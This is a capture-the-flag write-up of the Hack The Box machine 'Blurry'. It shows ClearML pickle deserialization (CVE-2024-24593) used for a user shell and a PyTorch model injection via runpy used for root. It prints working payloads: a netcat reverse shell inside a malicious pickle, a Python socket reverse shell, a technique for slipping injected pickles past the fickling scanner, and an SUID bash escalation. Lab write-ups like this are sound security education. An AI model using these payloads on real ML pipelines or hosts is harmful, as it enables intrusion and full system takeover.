---
layout: post
title: "HTB: Blurry"
box: blurry
img: /img/blurry/blurry
author: Andrew Cherney
date: 2024-10-12
tags: htb medium-box linux webapp python pytorch pickle sudo season-5
icon: "assets/icons/blurry.png"
post_description: "There's an old saying: a pickle in the hand is worth two in the Blurry. That is to mean starting this box is configuring a ClearML agent+account, then using a python script to create a .pkl file and upload it for a shell as jippity. Sudo is enabled for a custom python script to evaluate models. An exploit online can be used to inject the .pkl file in that archive utilizing runpy to import a maliciously crafted module to gain a shell as root. I feel like the name Dill would have been more suited given the box's solutions."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
nmap -sC 10.10.11.19 -Pn

Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-12 17:11 CDT
Nmap scan report for 10.10.11.19
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://app.blurry.htb/
```

## Port 80

```bash
dirsearch -u http://app.blurry.htb -x 400,404

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/Season5/Blurry/reports/http_app.blurry.htb/_24-06-12_17-19-13.txt

Target: http://app.blurry.htb/

[17:19:13] Starting: 
[17:19:44] 301 -  169B  - /app  ->  http://app.blurry.htb/app/
[17:19:44] 403 -  555B  - /app/
[17:19:45] 301 -  169B  - /assets  ->  http://app.blurry.htb/assets/
[17:19:45] 403 -  555B  - /assets/
[17:20:00] 200 -  139B  - /env.js
[17:20:02] 200 -    6KB - /favicon.ico
[17:20:04] 200 -    2B  - /files/
```

```bash
ffuf -w /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://blurry.htb -H "Host: FUZZ.blurry.htb" -mc 200,401

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://blurry.htb
 :: Wordlist         : FUZZ: /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.blurry.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,401
________________________________________________

app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 77ms]
files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 120ms]
chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 373ms]
:: Progress: [114441/114441] :: Job [1/1] :: 601 req/sec :: Duration: [0:03:18] :: Errors: 0 ::
```

Add all these to my /etc/hosts file and head over to the chat subdomain first.

### Rocket Chat

![rocket chat login page]({{ page.img }}_rocket_chat_login.png)

Rocket chat is a self hosted alternative to Teams, Slack, discord etc.. In the box Paper you needed a specific sign up link to make an account, but here it appears open to anyone. Make one and I'll dig around for any info.

![rocket chat logs]({{ page.img }}_rocket_chat_general.png)

Nothing of note here. I'll head to the app next.

### ClearML

{% include img_link src="/img/blurry/blurry_front_page" alt="front_page" ext="png" trunc=400 %}

ClearML from what I can glean is a way to run and test AI models through pipelines and other tasks. These tests are called experiments and exist under a project. The non-standard project here is "Black Swan" and seen below is a screenshot.

![black swan experiment]({{ page.img }}_black_swan.png)

I outlined the users we potentially need to target. Chad Jippity is an admin in this application and could be potentially running it on the machine. I peep the version number and [search snyk to find an insecure deserialization affecting this version](https://security.snyk.io/package/pip/clearml).

![ClearML version]({{ page.img }}_clearml_version.png)

# User as jippity

## CVE-2024-24593

Defined within [hacktrick's deserialization page](https://book.hacktricks.xyz/pentesting-web/deserialization#python) pickle's function of `__reduce__` can be used within a class to autorun code when the pickle artifact is loaded. Next we need to setup the ClearML agent to forward our requests for us. Luckily ClearML contains a getting started page and a new experiment set of API keys. Alternatively the keys can be created from settings.

{% include img_link src="/img/blurry/blurry_getting_started" alt="getting_started" ext="png" trunc=400 %}

![new experiment setup]({{ page.img }}_new_experiment.png)

Now we need to install clearml with pip and run clearml-init to generate a config file, which we can use to initialize the agent that will forward requests for us.

```bash
pip install clearml


clearml-init

Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
Or create a free account at https://app.clear.ml/settings/workspace-configuration

In settings page, press "Create new credentials", then press "Copy to clipboard".

Paste copied configuration here:
api {
  web_server: http://app.blurry.htb
  api_server: http://api.blurry.htb
  files_server: http://files.blurry.htb
  credentials {
    "access_key" = "3SVFUEFN0QIU398NNJ4E"
    "secret_key" = "4OHdHdC0u5Z2RD5HBLpoyEsdaUzVjPmGsfKO4v6n5AZHqsmL2j"
  }
}
Detected credentials key="3SVFUEFN0QIU398NNJ4E" secret="4OHd***"

ClearML Hosts configuration:
Web App: http://app.blurry.htb
API: http://api.blurry.htb
File Store: http://files.blurry.htb

Verifying credentials ...
Credentials verified!

New configuration stored in /home/raccoon/clearml.conf
ClearML setup completed successfully.
```

As an extra precaution I run the agent init as well.

```bash
clearml-agent init
*paste api keys when prompted*
*press enter on everything else*
```

Then I can finally run the agent daemon with the default queue and start uploading experiments.

```bash
clearml-agent --config-file clearml.conf daemon --queue default
```

The default getting started code should be satisfactory enough to test if I have a connection.

```python
from clearml import Task
task = Task.init(project_name='Black Swan', task_name='hello world')
```

Take my word for it after some troubleshooting it uploaded properly. Be sure all subdomains are within /etc/hosts and that your agent has been initialized with a proper .conf file. 

I then had to dive into [the dense documentation](https://clear.ml/docs/latest/docs) to determine how to upload a pickle artifact as per the CVE suggests this could be vulnerable to. [Under the ClearML SDK-->Task tab](https://clear.ml/docs/latest/docs/clearml_sdk/task_sdk/#logging-artifacts) there is reference to uploading artifacts. You define a task like with the test script then use the upload_artifact method off that task and define the artifact_object to send. In our case it should be a class with the `__reduce__` function and a shell. Lastly I will add the tag review as the chats hint they are coming up to a review and it can't hurt to add it.

The final step is realizing all this research wasn't necessary as the post within the CVE on NIST links to a [much better writeup giving a good shell for the code we need](https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/). Together that creates this payload:

```python
from clearml import Task
import pickle, os

class RunCommand:
    def __reduce__(self):
        return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.4 7777 >/tmp/f',))

command = RunCommand()

task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"])
task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")
```

Now we run the script, upload the artifact, and presumably wait for our shell.

```bash
python3 raccoon.js


nc -nvlp 7777

Listening on 0.0.0.0 7777
Connection received on 10.10.11.19 45458
sh: 0: can't access tty; job control turned off
$ id
uid=1000(jippity) gid=1000(jippity) groups=1000(jippity)
```

It is of note here the issue comes when a user interacts with the artifact that we uploaded. I believe the review tag is mandatory in that case as otherwise it might not be checked by the backend fake user.

# Root

## Option 1: Pytorch + Pickle

```bash
jippity@blurry:/tmp/.raccoon$ sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
```

```bash
/usr/bin/evaluate_model

#!/bin/bash
# Evaluate a given model against our proprietary dataset.
# Security checks against model file included.

if [ "$#" -ne 1 ]; then
    /usr/bin/echo "Usage: $0 <path_to_model.pth>"
    exit 1
fi

MODEL_FILE="$1"
TEMP_DIR="/models/temp"
PYTHON_SCRIPT="/models/evaluate_model.py"  

/usr/bin/mkdir -p "$TEMP_DIR"

file_type=$(/usr/bin/file --brief "$MODEL_FILE")

# Extract based on file type
if [[ "$file_type" == *"POSIX tar archive"* ]]; then
    # POSIX tar archive (older PyTorch format)
    /usr/bin/tar -xf "$MODEL_FILE" -C "$TEMP_DIR"
elif [[ "$file_type" == *"Zip archive data"* ]]; then
    # Zip archive (newer PyTorch format)
    /usr/bin/unzip -q "$MODEL_FILE" -d "$TEMP_DIR"
else
    /usr/bin/echo "[!] Unknown or unsupported file format for $MODEL_FILE"
    exit 2
fi

/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do
    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")

    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' >/dev/null; then
        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
        /bin/rm "$MODEL_FILE"
        break
    fi
done

/usr/bin/find "$TEMP_DIR" -type f -exec /bin/rm {} +
/bin/rm -rf "$TEMP_DIR"

if [ -f "$MODEL_FILE" ]; then
    /usr/bin/echo "[+] Model $MODEL_FILE is considered safe. Processing..."
    /usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
    
fi
```

TLDR; checks file type, properly decompresses based on results, runs fickling against the .pkl file present to scan for malicious content, if malicious deletes, if not runs the python script /models/evaluate_model.py against the model.

```python
/model/evaluate_model.py

import torch
import torch.nn as nn
from torchvision import transforms
from torchvision.datasets import CIFAR10
from torch.utils.data import DataLoader, Subset
import numpy as np
import sys


class CustomCNN(nn.Module):
    def __init__(self):
        super(CustomCNN, self).__init__()
        self.conv1 = nn.Conv2d(in_channels=3, out_channels=16, kernel_size=3, padding=1)
        self.conv2 = nn.Conv2d(in_channels=16, out_channels=32, kernel_size=3, padding=1)
        self.pool = nn.MaxPool2d(kernel_size=2, stride=2, padding=0)
        self.fc1 = nn.Linear(in_features=32 * 8 * 8, out_features=128)
        self.fc2 = nn.Linear(in_features=128, out_features=10)
        self.relu = nn.ReLU()

    def forward(self, x):
        x = self.pool(self.relu(self.conv1(x)))
        x = self.pool(self.relu(self.conv2(x)))
        x = x.view(-1, 32 * 8 * 8)
        x = self.relu(self.fc1(x))
        x = self.fc2(x)
        return x


def load_model(model_path):
    model = CustomCNN()
    
    state_dict = torch.load(model_path)
    model.load_state_dict(state_dict)
    
    model.eval()  
    return model

def prepare_dataloader(batch_size=32):
    transform = transforms.Compose([
	transforms.RandomHorizontalFlip(),
	transforms.RandomCrop(32, padding=4),
        transforms.ToTensor(),
        transforms.Normalize(mean=[0.4914, 0.4822, 0.4465], std=[0.2023, 0.1994, 0.2010]),
    ])
    
    dataset = CIFAR10(root='/root/datasets/', train=False, download=False, transform=transform)
    subset = Subset(dataset, indices=np.random.choice(len(dataset), 64, replace=False))
    dataloader = DataLoader(subset, batch_size=batch_size, shuffle=False)
    return dataloader

def evaluate_model(model, dataloader):
    correct = 0
    total = 0
    with torch.no_grad():  
        for images, labels in dataloader:
            outputs = model(images)
            _, predicted = torch.max(outputs.data, 1)
            total += labels.size(0)
            correct += (predicted == labels).sum().item()
    
    accuracy = 100 * correct / total
    print(f'[+] Accuracy of the model on the test dataset: {accuracy:.2f}%')

def main(model_path):
    model = load_model(model_path)
    print("[+] Loaded Model.")
    dataloader = prepare_dataloader()
    print("[+] Dataloader ready. Evaluating model...")
    evaluate_model(model, dataloader)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python script.py <path_to_model.pth>")
    else:
        model_path = sys.argv[1]  # Path to the .pth file
        main(model_path)

```

Don't need a TLDR here, this is a bunch of garbage aside from the pytorch module in use here. The first script did not look innately vulnerable to code injection and the security checks with fickling are probably in place to protect us from interacting with this evaluation script "maliciously". I'll grab the /models/demo_model.pth and unzip it to determine where I could inject a payload.

```bash
jippity@blurry:/tmp/.raccoon$ unzip demo_model.pth
Archive:  demo_model.pth
 extracting: smaller_cifar_net/data.pkl  
 extracting: smaller_cifar_net/byteorder  
 extracting: smaller_cifar_net/data/0  
 extracting: smaller_cifar_net/data/1  
 extracting: smaller_cifar_net/data/2  
 extracting: smaller_cifar_net/data/3  
 extracting: smaller_cifar_net/data/4  
 extracting: smaller_cifar_net/data/5  
 extracting: smaller_cifar_net/data/6  
 extracting: smaller_cifar_net/data/7  
 extracting: smaller_cifar_net/version  
 extracting: smaller_cifar_net/.data/serialization_id  
jippity@blurry:/tmp/.raccoon$ ls
demo_model.pth  linpeas.sh  pspy64  smaller_cifar_net
jippity@blurry:/tmp/.raccoon$ cd smaller_cifar_net/
jippity@blurry:/tmp/.raccoon/smaller_cifar_net$ ls
byteorder  data  data.pkl  version
jippity@blurry:/tmp/.raccoon/smaller_cifar_net$ cat byteorder 
littlejippity@blurry:/tmp/.raccoon/smaller_cifar_net$ cat version 
3
jippity@blurry:/tmp/.raccoon/smaller_cifar_net$ ls data
0  1  2  3  4  5  6  7
jippity@blurry:/tmp/.raccoon/smaller_cifar_net$ cat data *
cat: data: Is a directory
littlecat: data: Is a directory
�ccollections
OrderedDict
q)Rq(X
      conv1.weightqctorch._utils
_rebuild_tensor_v2
q((Xstorageqctorch
FloatStorage
qX0qXcpuqM�tQK(KKKKtq	(K	KKtq
�h)Rq
     tq
X      Rq
conv1.biasqh((hhX1qhKtqQKK�qK�q�h)RqtqRqX
                                         conv2.weightqh((hhX2qhMtqQK(K KKKtq(K�K	KKtq��h)RqqRqX
conv2.biasqh((hhX3qhK tq QKK �q!K�q"�h)Rq#tq$Rq%X
fc1.weightq&h((hhX4q'hJtq(QKK��q)K�q*�h)Rq+tq,Rq-fc1.biasq.h((hhX5q/hK�tq0QKK��q1K�q2�h)Rq3tq4Rq5X
fc2.weightq6h((hhX6q7hMtq8QKK
K��q9K�K�q:�h)Rq;tq<Rq=fc2.biasq>h((hhX7q?hK
tq@QKK
�qAK�qB�h)RqCtqDRqEu}qFX	_metadataqGh)RqH(XqI}qJXversionqKKsXconv1qL}qMhKKsXconv2qN}qOhKKsXpoolqP}qQhKKsXfc1qR}qShKKsXfc2qT}qUhKKsXreluqV}qWhKKsusb.3
```

The only true point I could inject into here seems to be the data.pkl file, certainly what the fickling portion is made to prevent. Now fickling can be used to inject stuff into .pkl files but I opted to search for a different solution. In my travels on the net I found [a post going over injecting ML models with ransomware](https://hiddenlayer.com/research/weaponizing-machine-learning-models-with-ransomware/#Pickle-Code-Injection-POC). There lies a script that allows us to define the execution method of the injected code between os.system, exec, eval, or runpy.

Now before reaching that post I tested a lot of fickling payloads and couldn't get them to run anything, even when varying the methods. Perhaps a skill issue but the post gave me an exploit to inject with that gave some results. Example of fickling failures below:

```bash
jippity@blurry:~$ fickling --inject "print('test')" smaller_cifar_net/data.pkl > data2.pkl
jippity@blurry:~$ ls
automation  clearml.conf  data2.pkl  demo_model.pth.bak  pickle_inject.py  smaller_cifar_net  user.txt
jippity@blurry:~$ mv smaller_cifar_net/data.pkl .
jippity@blurry:~$ mv data2.pkl smaller_cifar_net/data.pkl
jippity@blurry:~$ tar -cvf fickling_test.pth smaller_cifar_net/
smaller_cifar_net/
smaller_cifar_net/.data/
smaller_cifar_net/.data/serialization_id
smaller_cifar_net/data/
smaller_cifar_net/data/6
smaller_cifar_net/data/3
smaller_cifar_net/data/0
smaller_cifar_net/data/4
smaller_cifar_net/data/1
smaller_cifar_net/data/5
smaller_cifar_net/data/2
smaller_cifar_net/data/7
smaller_cifar_net/version
smaller_cifar_net/byteorder
smaller_cifar_net/data.pkl
jippity@blurry:~$ mv fickling_test.pth /models
jippity@blurry:~$ sudo /usr/bin/evaluate_model /models/fickling_test.pth 
[!] Model /models/fickling_test.pth contains OVERTLY_MALICIOUS components and will be deleted.
```

To save some writing the only method for executing code that works here is runpy, all the others end up being flagged within fickling. Run the exploit define the execution method then add the code. I tested with printing something as with all of my initial paylaods.

```bash
jippity@blurry:~$ python3 pickle_inject.py inject_test.pth runpy "print('hello')"
jippity@blurry:~$ mv inject_test.pth /models
jippity@blurry:~$ sudo /usr/bin/evaluate_model /models/inject_test.pth 
[+] Model /models/inject_test.pth is considered safe. Processing...
hello
[+] Loaded Model.
[+] Dataloader ready. Evaluating model...
[+] Accuracy of the model on the test dataset: 50.00%
```

And there it is our code execution through runpy. Now runpy if you look at the documentation can import modules and run them. From this I can import a module with a reverse shell and get root. Be sure the module is within the same directory as the model being tested (or by default here /models).

```python
# shell.py

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

```bash
jippity@blurry:~$ python3 pickle_inject.py runpy_module_run.pth runpy "import runpy;runpy.run_module(mod_name='shell')"
jippity@blurry:~$ cp runpy_module_run.pth /models/
jippity@blurry:~$ cp shell.py /models/
jippity@blurry:~$ sudo /usr/bin/evaluate_model /models/runpy_module_run.pth 
[+] Model /models/runpy_module_run.pth is considered safe. Processing...
```

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.19 37450
# whoami
root
```


## Option 2: modifying evaluate_model.py

Now if I have the ability to edit /models that means I can move files in and out, and since evaluate_model.py is run from a root bash script it will be run as root, meaning I can modify it to make /tmp/bash and make it an SUID. 

```bash
jippity@blurry:/tmp/.raccoon$ cp evaluate_model.py /models/
jippity@blurry:/tmp/.raccoon$ sudo /usr/bin/evaluate_model /models/demo_model.pth 
[+] Model /models/demo_model.pth is considered safe. Processing...
jippity@blurry:/tmp/.raccoon$ ls
backup.model  bash  demo_model.pth  evaluate_model.py  fickling_test.pth  linpeas.sh  pspy64  smaller_cifar_net
jippity@blurry:/tmp/.raccoon$ ./bash -p
bash-5.1# cat /root/root.txt
f7f3b34df530f-------------------
```
